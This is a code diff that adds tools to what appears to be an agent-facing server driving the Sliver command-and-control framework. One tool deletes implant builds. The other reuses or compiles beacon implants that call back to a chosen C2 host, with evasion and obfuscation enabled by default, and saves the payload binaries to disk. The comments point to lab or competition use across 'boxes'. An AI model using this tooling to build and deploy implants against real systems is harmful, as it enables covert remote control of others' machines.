@@ -364,6 +364,103 @@ def build_server(manager: SliverManager):
         return ok("implant regenerated", name=fname, saved_path=str(out_path),
                   size=len(data))
 
+    @tool(tier="yellow")
+    async def remove_implant_build(name: str) -> dict:
+        """Delete a build from the server's build store by name.
+
+        Use to evict a stale or surplus pool build before replacing it with a
+        fresh one. yellow-tier because it is irreversible on the server side.
+        On success the named build can no longer be regenerated.
+        """
+        await mgr.client.delete_implant_build(name)
+        return ok("implant build deleted", name=name)
+
+    @tool(tier="green")
+    async def regenerate_or_build(
+        c2_host: str,
+        protocol: str = "https",
+        os: str = "windows",
+        arch: str = "amd64",
+        fmt: str = "exe",
+        c2_port: int = 0,
+        is_beacon: bool = True,
+        interval: int = 60,
+        jitter: int = 30,
+        evasion: bool = True,
+        obfuscate: bool = True,
+    ) -> dict:
+        """Reuse an existing pool build or compile a fresh one.
+
+        Searches the server's build store for a build whose callback host,
+        protocol, OS, arch, and format all match. Matching builds are
+        regenerated (takes seconds); unmatched profiles compile fresh and are
+        named ``pool-<proto>-<osarch>`` for future reuse.
+
+        This is the preferred first step for default-on C2 per box: call it
+        before :func:`generate_beacon` so ~5 stable-LHOST builds can be kept
+        on tap and reused across boxes on the same platform VPN.
+        """
+        # validate arguments via build_implant_config; ValueError bubbles up to
+        # the tool wrapper which converts it to err("invalid argument: ...")
+        cfg, expected_url = build_implant_config(
+            is_beacon=is_beacon, os=os, arch=arch, fmt=fmt,
+            protocol=protocol, c2_host=c2_host, c2_port=c2_port,
+            interval=interval, jitter=jitter, evasion=evasion, obfuscate=obfuscate,
+        )
+        os_n = cfg.GOOS
+        arch_n = cfg.GOARCH
+        proto_n = protocol.lower()
+        pool_name = f"pool-{proto_n}-{os_n}{arch_n}"
+
+        # search existing builds for (os, arch, format, C2 URL) match
+        builds = await mgr.client.implant_builds() or {}
+        matched_name: str | None = None
+        for build_name, build_cfg in builds.items():
+            if (build_cfg.GOOS != os_n
+                    or build_cfg.GOARCH != arch_n
+                    or build_cfg.Format != cfg.Format):
+                continue
+            for c2 in build_cfg.C2:
+                if c2.URL == expected_url:
+                    matched_name = build_name
+                    break
+            if matched_name:
+                break
+
+        if matched_name:
+            gen = await mgr.client.regenerate_implant(matched_name)
+            data = gen.File.Data
+            fname = gen.File.Name or matched_name
+            out_path = payload_dir() / fname
+            out_path.write_bytes(data)
+            return ok(
+                "reused existing pool build (regenerated)",
+                reused=True,
+                matched_name=matched_name,
+                name=fname,
+                saved_path=str(out_path),
+                size=len(data),
+                c2=expected_url,
+                is_beacon=is_beacon,
+            )
+
+        # no match — compile fresh
+        gen = await mgr.generate_implant(cfg, name=pool_name)
+        data = gen.File.Data
+        fname = gen.File.Name or pool_name
+        out_path = payload_dir() / fname
+        out_path.write_bytes(data)
+        return ok(
+            "compiled fresh pool build",
+            reused=False,
+            name=fname,
+            pool_name=pool_name,
+            saved_path=str(out_path),
+            size=len(data),
+            c2=expected_url,
+            is_beacon=is_beacon,
+        )
+
     # ======================================================================
     # Sessions / beacons
     # ======================================================================
